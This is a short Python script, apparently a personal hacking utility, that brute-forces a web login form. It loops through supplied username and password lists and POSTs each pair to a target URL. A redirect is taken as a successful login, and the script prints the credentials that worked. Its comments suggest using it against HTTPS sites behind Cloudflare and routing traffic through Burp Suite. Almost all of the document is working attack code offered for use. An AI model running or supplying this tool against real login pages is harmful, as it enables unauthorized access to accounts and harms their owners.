#!/usr/bin/env python3
# This script is just a silly example to perform a brute against an https page behind cloudflare
# the proxy can be enabled removin ghe hashtag and the round bracket to enable it and the certificate verification
# that is necessary if you are using burpsuite but you gonna get a warning
#
# I have to improve the script to use options but I'm lazy to do it =P
#
# usage: ./brute_requests.py [users_list] [passwd_lists] [url]

import requests
import sys


def main():
	u = []
	p = []
	data = {'username':'', 'password':''}
	users = open(sys.argv[1], 'r')
	passwd = open(sys.argv[2], 'r')
	url = sys.argv[3]
	proxy = {"http":"127.0.0.1:8080", "https":"127.0.0.1:8080"}

	for i in users.readlines():
		u.append(i.rstrip('\n'))

	for i in passwd.readlines():
		p.append(i.rstrip('\n'))

	users.close()
	passwd.close()

	for user in u:
		data['username'] = user

		for passw in p:
			data['password'] = passw
            #print(data)

			#req = requests.get(url, verify=False, headers={"User-Agent":"Mozilla/9.0"}, proxies=proxy)
			r = requests.post(url, data=data, allow_redirects=True) #, verify=False, proxies=proxy)
			#print(len(r.history), r.status_code, data)
			#print(r.is_redirect)
			if len(r.history) > 0:
				print(f"-----\nLogin succes! with: L:{data['username']} and P:{data['password']}\n-----")
			

if __name__ == '__main__':
	main()
